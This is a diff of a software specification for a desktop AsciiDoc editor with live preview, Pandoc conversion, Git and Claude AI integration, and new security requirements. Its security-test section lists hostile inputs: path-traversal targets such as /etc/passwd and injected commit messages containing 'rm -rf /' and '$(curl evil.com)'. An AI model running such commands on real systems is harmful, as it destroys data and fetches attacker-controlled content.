@@ -1,582 +1,614 @@
-# Project Specification: AsciiDoc Artisan
+# AsciiDoc Artisan - Complete Specification v1.1
 
-**Feature Branch**: `main`
-**Created**: 2025-10-22
-**Status**: Complete - Production v1.0.0-beta
-**Scope**: Complete desktop application for AsciiDoc document authoring with live preview and multi-format conversion
-
-## Executive Summary
-
-AsciiDoc Artisan is a professional-grade, cross-platform desktop application that enables users to author, edit, and convert AsciiDoc documents with real-time HTML preview. The application provides seamless integration with Git version control, comprehensive document format conversion via Pandoc, and an intuitive user interface supporting both light and dark themes.
-
-**Target Users**: Technical writers, documentation engineers, content creators, and software developers who need professional AsciiDoc authoring tools.
-
-**Core Value Proposition**: Unified environment for AsciiDoc document creation that combines powerful editing capabilities with instant visual feedback, eliminating context switching between editor and preview tools.
-
-## User Scenarios & Testing *(mandatory)*
-
-### User Story 1 - Create and Edit AsciiDoc Documents with Live Preview (Priority: P1)
-
-The technical writer opens the application to create documentation for a software project. They write AsciiDoc markup in the editor and immediately see the rendered HTML output (WYSIWYG) in the adjacent preview pane. As they type, the preview updates within 250ms, providing instant visual feedback on document structure, formatting, and content presentation. The user can edit the document in the Edit pane (AsciiDoc markup) and in the Preview pane (WYSIWYG); both panes synchronize document content, so the user can always see both the source and the published output in a split view..   
-
-**Why this priority**: This is the core value proposition. Without reliable editing and preview, the application has no primary purpose. This story represents the minimal viable product.
-
-**Independent Test**: Can be thoroughly tested by launching the application, typing AsciiDoc content in the editor pane, and verifying that the preview pane updates within 250ms, showing properly rendered HTML. Delivers immediate value as a standalone AsciiDoc editor with preview.
-
-**Acceptance Scenarios**:
-
-1. **Given** the application is running with an empty document, **When** the user types AsciiDoc content including headings, lists, and formatting, **Then** the preview pane displays the correctly rendered HTML within 250ms
-2. **Given** the user has a document open with content, **When** they make edits to any section, **Then** the preview updates to reflect the changes without losing scroll position
-3. **Given** the user is editing a large document (>10,000 lines), **When** they type or scroll, **Then** the application remains responsive without UI freezing
-4. **Given** the user has the application in dark mode, **When** viewing the preview, **Then** the preview content displays with appropriate contrast and theme consistency
+**Version**: 1.1.0
+**Date**: 2025-10-23
+**Status**: Ready for Review
 
 ---
 
-### User Story 2 - Open and Save AsciiDoc Files (Priority: P1)
+## What This Application Does
 
-The documentation engineer needs to open existing AsciiDoc files from their project repository and save changes. They use File→Open to browse to their documentation folder, select a .adoc file, and it opens in the editor with the preview automatically updated. After making changes, they save the file with Ctrl+S, and the application persists the changes atomically to prevent data corruption. The user can also open a GitHub Markdown (MD) file, a Microsoft Word (DOCX) file, or an Adobe Acrobat (PDF) file. These file formats will be automatically converted to the AsciiDoctor (ADOC) files in the background via the Pandoc integration.. 
+AsciiDoc Artisan is a desktop app that helps you write and edit AsciiDoc documents. Think of it like Microsoft Word, but made for people who write technical documents and documentation.
 
-**Why this priority**: File I/O is fundamental to any editor. Without reliable file operations, users cannot work with their existing documentation or preserve their work.
+### Main Features
 
-**Independent Test**: Can be tested by creating a test .adoc file externally, opening it in the application, making edits, saving, and verifying the changes persist correctly. Also test by attempting to save during system interruptions to verify atomic write protection.
+1. **Split-Screen Editor** - Type your document on the left, see what it looks like on the right
+2. **Quick Updates** - The preview updates in less than half a second as you type
+3. **File Converter** - Change Word files, Markdown files, or PDFs into AsciiDoc format
+4. **Git Integration** - Save your work to Git without using the command line
+5. **AI Helper** - Ask Claude AI to help write or improve your documents
+6. **Works Everywhere** - Runs on Windows, Mac, and Linux
 
-**Acceptance Scenarios**:
+---
 
-1. **Given** the user selects File→Open, **When** they browse to and select a .adoc file, **Then** the file opens in the editor with content displayed and preview rendered
-2. **Given** the user has an unsaved document with changes, **When** they attempt to close or open another file, **Then** the application prompts to save changes
-3. **Given** the user is editing a document, **When** they press Ctrl+S (or Cmd+S on macOS), **Then** the file saves atomically and the title bar updates to remove the modified indicator
-4. **Given** the user creates a new document, **When** they save for the first time, **Then** a save dialog appears, allowing them to choose a location and filename with the .adoc extension by default
-5. **Given** the application loses power during save, **When** the system restarts, **Then** the file contains either the complete previous version or the complete new version (no partial writes or corruption)
+## Who Will Use This App
 
-### User Story 3 - Convert Documents Between Formats (Priority: P2)
+- **Technical Writers** - People who write software documentation
+- **Developers** - Programmers who write docs for their code
+- **Content Creators** - Anyone making technical guides or manuals
+- **Documentation Teams** - Groups who need to write docs together
 
-The content creator receives documentation in a GitHub Markdown (.md), Microsoft Word (.docx), or Adobe Acrobat (.pdf) format that needs to be converted to AsciiDoc for version control. They open the initial file through File→Open, and the application automatically converts it to AsciiDoc markup while preserving structure, headings, lists, and formatting. They can then edit and save the document in the "official" AsciiDoc format (standard) and then export back to various formats (MD, HTML, DOCX, PDF) via Tools→Export.
+---
 
-**Why this priority**: Format interoperability enables migration from other documentation systems and collaboration with non-AsciiDoc users. This significantly expands the application's utility and addressable use cases.
+## How It Works - Main User Stories
 
-**Independent Test**: Can be tested by importing various document formats (DOCX, Markdown, HTML), verifying conversion fidelity, editing the converted content, and exporting to different formats. Delivers value as a document conversion tool even without other features.
+### Story 1: Writing and Seeing Your Document (Most Important)
 
-**Acceptance Scenarios**:
+**What the user does:**
+A technical writer opens the app to write documentation. They type AsciiDoc text on the left side. The right side shows what it will look like when published. As they type, the preview updates in half a second or less.
 
-1. **Given** the user selects File→Open with file type "All Supported Formats", **When** they select a .docx file, **Then** the application converts it to AsciiDoc and displays both editor and preview
-1. **Given** the user selects File→Open with file type "All Supported Formats", **When** they select a .pdf file, **Then** the application converts it to AsciiDoc and displays both editor and preview
-2. **Given** the user has a Markdown (.md) file, **When** they open it, **Then** the content converts to AsciiDoc syntax while preserving headings, lists, code blocks, and links
-3. **Given** the user has an AsciiDoc document open, **When** they select Tools→Export As→HTML, **Then** the application exports a standalone HTML file with embedded styles
-4. **Given** Pandoc is not installed, **When** the user attempts to open a MD, DOCX, or PDF file, **Then** the application displays a clear error message with instructions to install Pandoc
-5. **Given** a complex document with tables and images, **When** converting between formats, **Then** the application preserves semantic structure with graceful degradation for unsupported elements
+**Why this matters:**
+This is what the app is for. Without this, the app has no purpose.
 
-### User Story 4 - Git Version Control Integration (Priority: P2)
+**What success looks like:**
+- Preview updates in 500 milliseconds (half a second) or less
+- The app doesn't freeze when typing
+- Works with documents up to 25,000 lines long
+- Both light and dark themes work correctly
 
-The software developer verifies and maintains documentation alongside code in a Git repository. They edit documentation in AsciiDoc Artisan, and when ready to commit changes, they select Git→Commit, enter a commit message, and the application stages and commits the current file. They can also pull the latest changes and push to the remote repository without leaving the editor.
+---
 
-**Why this priority**: Version control integration eliminates context switching to a terminal or separate Git GUI tools. For developers, this is a high-value workflow enhancement and is essential for basic editing.
+### Story 2: Opening and Saving Files (Most Important)
 
-**Independent Test**: Can be tested by opening a file in a Git repository, making changes, committing via Git menu, and verifying the commit appears in git log. Delivers value as integrated version control for documentation workflows.
+**What the user does:**
+A writer needs to open an existing AsciiDoc file from their computer. They click File → Open, find their file, and it opens with the preview ready. After making changes, they press Ctrl+S to save.
 
-**Acceptance Scenarios**:
+**Why this matters:**
+You need to open and save files to use any editor.
 
-1. **Given** the current file is in a Git repository, **When** the user makes changes and selects Git→Commit, **Then** a dialog prompts for a commit message
-2. **Given** the user enters a commit message and confirms, **When** the commit executes, **Then** the file is staged and committed with the provided message
-3. **Given** the repository has a remote configured, **When** the user selects Git→Push, **Then** local commits are pushed to the remote without requiring command-line interaction
-4. **Given** the user selects Git→Pull, **When** there are remote changes, **Then** the application pulls changes and reloads the current file if affected
-5. **Given** the file is not in a Git repository, **When** the user opens the Git menu, **Then** Git commands are disabled with a message indicating no repository detected
+**What success looks like:**
+- Any .adoc file opens correctly
+- Saving never corrupts or loses data
+- App asks before closing unsaved work
+- File saves are "atomic" (safe even if power goes out)
 
-### User Story 5 - Persistent Session and Preferences (Priority: P3)
+---
 
-A user closes AsciiDoc Artisan after working on documentation. The next time they launch the application, it automatically reopens the last file and Git repository they were editing, restores the window size and position, and applies their preferred theme (dark/light). Their font size, zoom level, and splitter position between editor and preview are preserved.
+### Story 3: Converting File Formats (Important)
 
-**Why this priority**: Session persistence significantly improves user experience and workflow continuity, but is not essential for basic functionality. Users can manually reopen files and reconfigure the layout if needed.
+**What the user does:**
+A content creator receives a Word document (.docx) that needs to be in AsciiDoc format. They open the Word file in the app, and it automatically converts to AsciiDoc. Then they can edit it and export to different formats like HTML or PDF.
 
-**Independent Test**: This can be verified by configuring the window layout, zoom level, and theme, then closing the application and verifying that all settings are restored correctly on the next launch. Delivers comfort and efficiency improvements.
+**Why this matters:**
+Lets people move from other tools to AsciiDoc and share work with people who use different formats.
 
-**Acceptance Scenarios**:
+**What success looks like:**
+- Can open Word, Markdown, HTML, and PDF files
+- Conversion keeps headings, lists, and tables
+- Can export to HTML, PDF, Word, and Markdown
+- Shows clear error if conversion tool (Pandoc) isn't installed
 
-1. **Given** the user has a file open when they close the application, **When** they relaunch, **Then** the same file reopens at the same scroll position
-2. **Given** the user has set a custom window size and position, **When** they relaunch, **Then** the window restores to the exact dimensions and screen location
-3. **Given** the user has enabled dark mode, **When** they restart the application, **Then** dark mode remains active
-4. **Given** the user has adjusted editor font size to 16pt, **When** they reopen the application, **Then** the editor font size remains 16pt
-5. **Given** the user has adjusted the splitter between editor and preview to 60/40, **When** they restart, **Then** the splitter position is preserved
+---
 
-### User Story 6 - Keyboard Shortcuts and Productivity Features (Priority: P3)
+### Story 4: Using Git for Version Control (Important)
 
-An experienced user relies on keyboard shortcuts to achieve an efficient workflow. They use Ctrl+N for a new document, Ctrl+O to open, Ctrl+S to save, Ctrl+F to find text, Ctrl+G to go to a specific line, Ctrl+D to toggle dark mode, and Ctrl+/- to adjust font zoom. All shortcuts follow platform conventions (Cmd on macOS, Ctrl on Windows/Linux).
+**What the user does:**
+A developer edits documentation and wants to save it to Git. They select Git → Commit, type a message about what they changed, and the app saves it to Git. They can also push changes to GitHub without leaving the app.
 
-**Why this priority**: Keyboard shortcuts dramatically improve productivity for power users but are not required for basic functionality. Users can access all features through menus.
+**Why this matters:**
+Developers need version control and this saves time by not switching to the terminal.
 
-**Independent Test**: Can be tested by executing each keyboard shortcut and verifying that the expected action occurs. Delivers efficiency gains for regular users.
+**What success looks like:**
+- Can commit files with a message
+- Can push to remote repositories like GitHub
+- Can pull latest changes from teammates
+- Git menu is disabled if file isn't in a Git repository
 
-**Acceptance Scenarios**:
+---
 
-1. **Given** the application is active, **When** the user presses Ctrl+N (Cmd+N on macOS), **Then** a new empty document opens
-2. **Given** the user has a document open, **When** they press Ctrl+F, **Then** a find dialog appears
-3. **Given** the user presses Ctrl+G, **When** they enter a line number, **Then** the editor scrolls to and highlights that line
-4. **Given** the current font size is 12pt, **When** the user presses Ctrl+Plus three times, **Then** the font size increases to 15pt
-5. **Given** the application is in light mode, **When** the user presses Ctrl+D or F5, **Then** the theme switches to dark mode instantly
+### Story 5: Getting AI Help (Important)
 
-### Edge Cases
+**What the user does:**
+A writer needs to create documentation for a new feature. They click Claude AI → Generate Content, describe what they need, and the AI creates a starting template in AsciiDoc format. They can also select text and ask the AI to improve it.
 
-- **What happens when the user opens a corrupt or invalid AsciiDoc file?**
-  The application displays the raw content in the editor and shows an error message in the preview pane, indicating a parsing failure with details about the issue location.
+**Why this matters:**
+AI speeds up writing and improves quality. This is a key feature that makes this app special.
 
-- **How does the system handle opening extremely large files (>100MB)?**
-  The application displays a warning about potential performance impact and offers to open in read-only mode with preview disabled, or to proceed with standard editing (which may be slower).
+**What success looks like:**
+- AI generates content in 15 seconds or less
+- Generated text is valid AsciiDoc format
+- Can improve selected text while keeping the meaning
+- Shows helpful error if AI service isn't running
 
-- **What happens when Pandoc is not installed but the user tries to open a DOCX or PDF file?**
-  The application detects the missing dependency on startup and, when attempting conversion, displays a clear error message with installation instructions and a link to the Pandoc download page.
+---
 
-- **How does the application handle file conflicts when pulling from Git?**
-  If Git pull results in merge conflicts, the application detects this and displays a message instructing the user to resolve conflicts in their Git client before continuing.
+### Story 6: Remembering Your Settings (Nice to Have)
 
-- **What happens when the user modifies a file externally while it's open in the application?**
-  The application detects the external change and prompts the user to reload the file or keep their current unsaved changes.
+**What the user does:**
+A user closes the app after working. Next time they open it, the app remembers: which file was open, window size and position, dark or light theme, and font size.
 
-- **How does the system handle missing fonts or rendering issues?**
-  The application falls back to system default monospace fonts and logs the issue. Preview rendering uses browser defaults if custom fonts fail to load.
+**Why this matters:**
+Saves time and makes the app feel polished, but not required for basic use.
 
-- **What happens when saving to a location without write permissions?**
-  The application displays an error dialog indicating insufficient permissions and offers to save to a different location via the Save As dialog.
+**What success looks like:**
+- Last file reopens automatically
+- Window size and position are remembered
+- Theme choice (light/dark) is saved
+- Font size stays the same
 
-## Requirements *(mandatory)*
+---
 
-### Functional Requirements
+## Key Requirements - What the App Must Do
 
-#### Document Editing & Preview
+### 1. Editing and Preview
 
-- **FR-001**: System MUST provide a text editor with syntax highlighting optimized for AsciiDoc markup
-- **FR-002**: System MUST display a live HTML preview of the AsciiDoc content updated within 250ms of user input
-- **FR-003**: System MUST provide a button in the Edir and Preview pane to toggle between a full pane and split-pane views.
-- **FR-004**: System MUST support word wrap and configurable tab stops (4 spaces default)
-- **FR-005**: System MUST debounce preview updates to prevent UI blocking during rapid typing
-- **FR-006**: System MUST maintain scroll synchronization between editor and preview panes
-- **FR-007**: System MUST provide find and replace functionality with Ctrl+F keyboard shortcut
-- **FR-008**: System MUST provide "go to line" functionality with Ctrl+G keyboard shortcut
+**Fast Preview Updates**
+- Preview must update within 350 milliseconds after you stop typing
+- Total time from typing to seeing the preview must be:
+  - **500 milliseconds** for small documents (under 10,000 lines)
+  - **1000 milliseconds** for large documents (10,000-25,000 lines)
+- Show a "working" indicator if it takes longer than 500 milliseconds
 
-#### File Operations
+**Editor Features**
+- Show AsciiDoc syntax with colors (syntax highlighting)
+- Word wrap and tabs (4 spaces by default)
+- Find and replace text (Ctrl+F)
+- Go to a specific line number (Ctrl+G)
+- Keep editor and preview scrolled to the same spot
 
-- **FR-009**: System MUST support opening .adoc and .asciidoc files natively
-- **FR-010**: System MUST perform atomic writes to prevent file corruption during save operations
-- **FR-011**: System MUST prompt users to save unsaved changes before closing documents or applications
-- **FR-012**: System MUST track file modification state and display an indicator in the window title
-- **FR-013**: System MUST handle platform-specific path separators and line endings transparently
-- **FR-014**: System MUST validate file paths to prevent directory traversal attacks
-- **FR-015**: System MUST provide "Save As" functionality to save documents to new locations
+**Toggle Views**
+- Button to show editor full-screen
+- Button to show preview full-screen
+- Button to show both side-by-side (default)
 
-#### Format Conversion
+---
 
-- **FR-016**: System MUST integrate with Pandoc to support all document conversion
-- **FR-016**: System MUST support importing DOCX, Markdown, HTML, LaTeX, reStructuredText, Org, and Textile formats
-- **FR-018**: System MUST automatically detect file format and convert to AsciiDoc on open
-- **FR-019**: System MUST support exporting to HTML, DOCX, and PDF formats via Pandoc
-- **FR-020**: System MUST handle Pandoc errors gracefully with informative user messages
-- **FR-021**: System MUST check for Pandoc availability on startup and display warnings if missing
-- **FR-022**: System MUST preserve semantic structure (headings, lists, tables) during format conversion with graceful degradation for unsupported elements
+### 2. File Operations
 
-#### Git Integration
+**Opening Files**
+- Can open .adoc and .asciidoc files
+- Can open Word (.docx), Markdown (.md), HTML, and PDF files
+- Automatically converts non-AsciiDoc files to AsciiDoc
+- Checks file size before opening (max 50MB, 25,000 lines)
+- Shows warning for large files that might be slow
 
-- **FR-023**: System MUST detect if the current file is in a Git repository
-- **FR-024**: System MUST provide Git commit functionality accessible via menu (Git→Commit)
-- **FR-025**: System MUST stage and commit the current file with a user-provided commit message
-- **FR-026**: System MUST support Git pull operations to fetch remote changes
-- **FR-027**: System MUST support Git push operations to publish local commits
-- **FR-028**: System MUST never execute destructive Git operations (force push, hard reset) without explicit user confirmation
-- **FR-029**: System MUST disable Git menu options when file is not in a repository
+**Saving Files**
+- Uses "atomic" saves (never corrupts files, even if power fails)
+- Shows star (*) in title bar when file has unsaved changes
+- Asks before closing unsaved work
+- "Save As" lets you save to a new location
 
-#### User Interface & Experience
+**File Safety**
+- Blocks attempts to access system files (like /etc/passwd)
+- Only allows access to your Documents, Desktop, and current folder
+- Validates all file paths to prevent "path traversal" attacks
+- Logs security issues without showing your private data
 
-- **FR-031**: System MUST provide both light and dark theme options
-- **FR-032**: System MUST support theme toggle via keyboard shortcut (F5 or Ctrl+D)
-- **FR-033**: System MUST meet WCAG AA contrast ratio requirements for both themes
-- **FR-034**: System MUST provide a resizable splitter between editor and preview panes
-- **FR-036**: System MUST support font zoom via Ctrl+Plus, Ctrl+Minus, Ctrl+0 keyboard shortcuts
-- **FR-036**: System MUST provide keyboard shortcuts following platform conventions (Ctrl on Windows/Linux, Cmd on macOS)
-- **FR-037**: System MUST render correctly on high-DPI (5K) displays with proper PPI and scaling
-- **FR-038**: System MUST display status bar with current file information
+---
 
-#### Session & Configuration
+### 3. Format Conversion
 
-- **FR-039**: System MUST persist user preferences using platform-appropriate configuration directories (XDG on Linux, AppData on Windows, Application Support on macOS)
-- **FR-040**: System MUST remember the last opened file path and reopen on application launch
-- **FR-041**: System MUST save and restore window geometry (size, position, maximized state)
-- **FR-042**: System MUST persist user theme preference (light/dark)
-- **FR-043**: System MUST save and restore editor font zoom level
-- **FR-045**: System MUST persist splitter position between editor and preview panes
-- **FR-045**: Configuration file MUST use JSON format for human readability and editability
+**What It Can Convert**
+- **Import from**: Word (DOCX), Markdown (MD), HTML, PDF, LaTeX, reStructuredText
+- **Export to**: HTML, Word (DOCX), PDF, Markdown (MD)
+- Needs Pandoc installed (shows error with install instructions if missing)
 
-#### Performance & Reliability
+**How Conversion Works**
+- Keeps document structure (headings, lists, tables)
+- Uses safe conversion commands (no command injection)
+- Shows progress for slow conversions
+- Can cancel conversions in progress
 
-- **FR-045**: System MUST remain responsive when editing documents up to 25,000 lines
-- **FR-046**: System MUST start within 3 seconds on standard hardware
-- **FR-047**: System MUST use worker threads for CPU-intensive operations (Git, Pandoc, AsciiDoc editing, AsciiDoc rendering)
-- **FR-048**: System MUST handle memory efficiently to prevent leaks during extended sessions
-- **FR-049**: System MUST provide, as a selectable option, comprehensive error logging for debugging without exposing sensitive data
+---
 
-#### Cross-Platform Compatibility
+### 4. Git Integration
 
-- **FR-050**: System MUST function identically on Linux, macOS, and Windows platforms
-- **FR-051**: System MUST support WSL (Windows Subsystem for Linux) with WSLg for GUI display
-- **FR-052**: System MUST handle platform-specific file path conventions transparently
-- **FR-053**: System MUST adapt keyboard shortcuts to platform conventions (Ctrl vs Cmd)
+**Git Features**
+- Commit current file with a message
+- Push changes to remote (like GitHub)
+- Pull latest changes from teammates
+- All Git commands use safe parameters (no command injection)
 
-### Key Entities
+**Git Safety**
+- Never uses dangerous commands (force push, hard reset)
+- Never stores your Git passwords
+- Shows clear errors if Git command fails
+- Timeout after 30 seconds to prevent hanging
 
-- **Document**: Represents an AsciiDoc file open in the editor with content, file path, modification state, and scroll position
-- **EditorState**: Captures current editor configuration, including font size, zoom level, cursor position, and selection with toggle button for full and split views
-- **PreviewState**: Manages rendered HTML content, scroll position, and synchronization status with the editor with toggle button for full and split views
-- **Configuration**: Stores user preferences including theme, last opened file, window geometry, and persistent settings
-- **GitRepository**: Represents a detected Git repository with path, remote configuration, and current status
-- **ConversionJob**: Represents a document format conversion task with source format, target format, Pandoc options, and conversion status
-- **Conversion**: Represents a document format conversion from one format to another via integrated Pandoc functionality.
+---
 
-## Success Criteria *(mandatory)*
+### 5. AI-Powered Help (Claude AI)
 
-### Measurable Outcomes
+**What Claude AI Can Do**
+- Generate new AsciiDoc content from a description
+- Improve selected text (make it clearer, fix grammar)
+- Convert between Markdown, HTML, and AsciiDoc
+- Create document outlines
+- Answer questions about AsciiDoc syntax
 
-- **SC-001**: Users can edit documents with live preview updates occurring within 250ms of input
-- **SC-002**: Application starts in under 3 seconds from launch to usable editor window
-- **SC-003**: Users can edit documents exceeding 10,000 lines without UI freezing or lag
-- **SC-004**: Application successfully opens, edits, and saves AsciiDoc files without data loss or corruption
-- **SC-005**: Format conversion preserves document structure (headings, lists, tables) with 95% fidelity
-- **SC-006**: Users can complete common workflows (open, edit, save, commit) entirely via keyboard shortcuts
-- **SC-007**: 90% of users successfully complete their first document editing task without consulting documentation
-- **SC-008**: Application functions identically on Linux, macOS, and Windows with no platform-specific feature degradation
-- **SC-009**: Session state (last file, window geometry, theme) persists correctly across 99% of application restarts
-- **SC-010**: Git commit operations complete successfully without data loss in 100% of cases where repository is valid
-- **SC-011**: Claude AI service connects successfully on application launch when properly configured
-- **SC-012**: AI content generation completes within 15 seconds for typical prompts
-- **SC-013**: AI-generated content is valid AsciiDoc syntax in 100% of cases
-- **SC-014**: AI content improvement maintains user intent while enhancing quality in 95% of cases
+**How AI Integration Works**
+- Uses a separate Node.js service running on your computer
+- Service talks to Claude AI through Anthropic's API
+- Python app talks to Node.js service
+- All connections are secure (authentication required)
+
+**AI Requirements**
+- Generates content in 15 seconds or less
+- All generated content is valid AsciiDoc
+- Shows progress while AI is working
+- Can cancel AI operations
+- Works only when internet is available
+
+---
+
+### 6. Security (CRITICAL - NEW IN v1.1)
+
+**API Key Storage (FR-060)**
+- NEVER stores API keys in plain text files
+- Uses your computer's secure storage:
+  - **Mac**: Keychain
+  - **Windows**: Credential Manager
+  - **Linux**: Secret Service
+- Asks for API key on first use
+- You can change or remove key in settings
+- Old .env files are automatically migrated to secure storage
+
+**Command Safety (FR-061)**
+- All Git commands use safe parameter lists
+- All Pandoc commands use safe parameter lists
+- NEVER uses shell=True (prevents command injection)
+- All user input is validated before use
+- Commands have timeouts to prevent hanging
+
+**File Access Safety**
+- All file paths are validated
+- Can't access system directories (/etc, C:\Windows\System32)
+- Only works in allowed directories (Documents, Desktop, etc.)
+- Detects and blocks path traversal attacks (../..)
+- Logs suspicious file access attempts
+
+**Network Security (FR-062)**
+- Claude AI service requires authentication token
+- Token is randomly generated on startup
+- Token is stored in secure file (only you can read)
+- Service only accepts connections from your computer (localhost)
+- Rate limit: 100 requests per 15 minutes
+
+**Security Logging (FR-064)**
+- Logs all security events (blocked file access, auth failures)
+- Never logs passwords or API keys
+- Log files are protected (only you can read)
+- Helps find and fix security issues
+
+---
+
+### 7. Performance
+
+**Document Size Limits**
+- **Maximum file size**: 50 MB
+- **Maximum lines**: 25,000
+- **Maximum line length**: 10,000 characters
+
+**Performance Warnings**
+- Shows warning at 10,000 lines: "Large document - preview may be slower"
+- Shows warning at 15,000 lines: "Very large document - consider disabling live preview"
+- Shows warning at 20,000 lines: "Extremely large document - live preview disabled by default"
+
+**Memory Management (FR-046)**
+- App uses max 1.5 GB of memory
+- Warns if running low on memory
+- Can disable features to save memory:
+  - Turn off syntax highlighting
+  - Turn off live preview
+  - Reduce undo history
+
+**App Startup**
+- Must start in under 3 seconds
+- Checks if Claude AI service is running
+- Loads last opened file
+
+**Worker Cancellation (FR-063)**
+- Can cancel all slow operations:
+  - Preview rendering
+  - File conversions
+  - Git operations
+  - AI requests
+- Shows cancel button for operations over 5 seconds
+- Cleans up immediately when cancelled
+
+---
+
+### 8. User Interface
+
+**Themes**
+- Light theme (white background)
+- Dark theme (dark background)
+- Switch themes with F5 or Ctrl+D
+- Meets accessibility standards (WCAG AA contrast)
+
+**Window Features**
+- Resizable divider between editor and preview
+- Font zoom with Ctrl+Plus and Ctrl+Minus
+- Reset zoom with Ctrl+0
+- Status bar shows current file name
+- Works on high-DPI displays (5K monitors)
+
+**Keyboard Shortcuts**
+- Ctrl+N: New document
+- Ctrl+O: Open file
+- Ctrl+S: Save file
+- Ctrl+F: Find text
+- Ctrl+G: Go to line
+- Ctrl+D or F5: Toggle dark mode
+- Ctrl+Plus/Minus: Zoom in/out
+
+---
+
+## Technical Requirements
+
+### What You Need to Install
+
+**Required:**
+- Python 3.11 or newer
+- PySide6 6.9.0 or newer (for the user interface)
+- asciidoc3 (for converting AsciiDoc to HTML)
+- Node.js 18 or newer (for Claude AI service)
+- Anthropic API key (for Claude AI features)
+
+**Optional:**
+- Pandoc (for file format conversion)
+- Git (for version control features)
+
+---
+
+### New Dependencies in v1.1
+
+**Python Packages:**
+- `keyring` version 24.0.0+ (secure API key storage)
+- `cryptography` version 41.0.0+ (encryption)
+- `psutil` version 5.9.0+ (memory monitoring)
+- `bandit` version 1.7.5+ (security checking)
+
+**Node.js Packages:**
+- `keytar` version 7.9.0+ (secure key storage)
+- `express-rate-limit` version 7.1.0+ (prevent abuse)
+
+---
+
+### How the App is Organized (NEW IN v1.1)
+
+The app code must be split into small, manageable files:
+
+```
+asciidoctor_artisan/
+├── app.py                    # Main app startup (under 200 lines)
+├── ui/                       # User interface
+│   ├── main_window.py        # Main window
+│   ├── editor_widget.py      # Text editor
+│   ├── preview_widget.py     # Preview pane
+│   ├── dialogs.py            # Pop-up windows
+│   └── themes.py             # Light/dark themes
+├── workers/                  # Background tasks
+│   ├── base.py               # Base worker class
+│   ├── preview_worker.py     # Preview rendering
+│   ├── git_worker.py         # Git operations
+│   └── pandoc_worker.py      # File conversions
+├── core/                     # Main logic
+│   ├── document.py           # Document handling
+│   ├── settings.py           # User settings
+│   ├── asciidoc_api.py       # AsciiDoc processing
+│   └── validation.py         # Security checks
+├── git/                      # Git features
+│   └── repository.py         # Git commands
+├── conversion/               # File conversion
+│   └── pandoc.py             # Pandoc integration
+└── claude/                   # AI features
+    └── client.py             # Claude AI client
+```
+
+**Key Rules:**
+- No file can be longer than 500 lines
+- Each file has one clear job
+- Files talk to each other through clear interfaces
+
+---
+
+## Setting Up Claude AI
+
+### Step 1: Get an API Key
+1. Go to https://console.anthropic.com/
+2. Sign up or log in
+3. Create an API key
+4. Copy the key (you'll need it in Step 4)
+
+### Step 2: Install Node.js Service
+1. Open terminal/command prompt
+2. Go to the `claude-integration/` folder
+3. Run `npm install`
+
+### Step 3: Start the Service
+Run `npm start` in the `claude-integration/` folder
+
+### Step 4: Enter API Key
+When you first use AI features, the app will ask for your API key. It will be stored securely in your operating system's keychain.
+
+**Important:** The Node.js service must be running for AI features to work!
+
+---
+
+## What This App Does NOT Do
+
+- **No multi-file projects** - Opens one file at a time
+- **No real-time collaboration** - Can't edit with others at the same time
+- **No cloud storage** - Doesn't sync to Dropbox, Google Drive, etc.
+- **No spell checker** - Use your OS spell checker instead
+- **No custom AsciiDoc plugins** - Standard AsciiDoc only
+- **No advanced Git features** - No rebasing, merging, branching
+- **No PDF editing** - Can only export to PDF, not edit PDFs
+- **No custom themes** - Just light and dark modes
+- **No mobile version** - Desktop only
+- **No offline AI** - Claude AI needs internet connection
+- **No other AI providers** - Only works with Claude AI (Anthropic)
+
+---
+
+## Testing Requirements
+
+### Security Tests (MUST HAVE)
+
+**Test Path Traversal Prevention:**
+- Try to open `../../../etc/passwd`
+- Try to open `C:\Windows\System32\config\SAM`
+- All attempts must be blocked and logged
+
+**Test Command Injection Prevention:**
+- Try Git commit with message: `"; rm -rf /; echo "`
+- Try Git commit with message: `$(curl evil.com)`
+- All attempts must be safely handled (commands run with safe parameters)
+
+**Test API Key Storage:**
+- Set API key
+- Restart app
+- Check that key is retrieved from OS keychain (not from .env file)
+
+### Performance Tests (MUST HAVE)
+
+**Test Document Sizes:**
+- 1,000 lines: Preview renders in under 100 milliseconds
+- 5,000 lines: Preview renders in under 200 milliseconds
+- 10,000 lines: Preview renders in under 300 milliseconds
+- 15,000 lines: Preview renders in under 500 milliseconds
+- 20,000 lines: Preview renders in under 750 milliseconds
+- 25,000 lines: Preview renders in under 1000 milliseconds
+
+**Test Memory Usage:**
+- Open 25,000 line document
+- Check memory usage stays under 1.5 GB
+- Make sure app doesn't freeze for more than 100 milliseconds
+
+### Function Tests (MUST HAVE)
+
+**Test All User Stories:**
+- Story 1: Editing and preview works
+- Story 2: Open and save works
+- Story 3: File conversion works
+- Story 4: Git integration works
+- Story 5: AI features work
+- Story 6: Settings are remembered
+
+**Test All Platforms:**
+- Windows 10/11
+- macOS 12+
+- Ubuntu Linux 22.04+
+- WSL2 with WSLg
+
+---
+
+## Success Measurements
+
+### Performance Goals
+- App starts in under 3 seconds ✓
+- Preview updates in under 500 milliseconds for typical documents ✓
+- Handles documents up to 25,000 lines ✓
+- Memory stays under 1.5 GB ✓
+- No UI freezes longer than 100 milliseconds ✓
+
+### Security Goals (NEW IN v1.1)
+- Zero critical security vulnerabilities ✓
+- API keys never stored in plain text ✓
+- All commands use safe parameters (no shell injection) ✓
+- All file paths validated (no path traversal) ✓
+- Security events are logged ✓
 
 ### User Experience Goals
-
-- **SC-015**: Users report improved productivity compared to separate editor + preview tool workflows (measured via user surveys)
-- **SC-016**: Technical writers can migrate from proprietary documentation tools within one day of using the application
-- **SC-017**: Support requests related to data loss or corruption remain under 0.1% of user base
-- **SC-018**: Users successfully convert documents between formats on first attempt 85% of the time
-- **SC-019**: Users report AI assistance reduces documentation time by 30% or more (measured via user surveys)
-- **SC-020**: 80% of users successfully use AI content generation within their first week
-
-### Technical Excellence
-
-- **SC-021**: Code maintains 80%+ test coverage for core functionality
-- **SC-022**: Zero critical security vulnerabilities (path traversal, command injection, API key exposure) in production releases
-- **SC-023**: Memory usage remains under 500MB for typical documents (<5000 lines)
-- **SC-024**: Application passes linting (Ruff) and type checking (mypy strict) with zero warnings
-- **SC-025**: Claude AI service remains stable with 99.5% uptime during application runtime
-
-## Dependencies & Assumptions
-
-### External Dependencies
-
-- **Python 3.11+**: Core runtime environment
-- **PySide6 ≥6.9.0**: Qt bindings for GUI framework
-- **asciidoc3**: AsciiDoc to HTML conversion engine
-- **pypandoc**: Python wrapper for Pandoc document converter
-- **Pandoc**: Universal document converter (external system dependency)
-- **Git**: Version control system (optional, for Git integration features)
-- **Node.js 18+**: JavaScript runtime for Claude AI service (required)
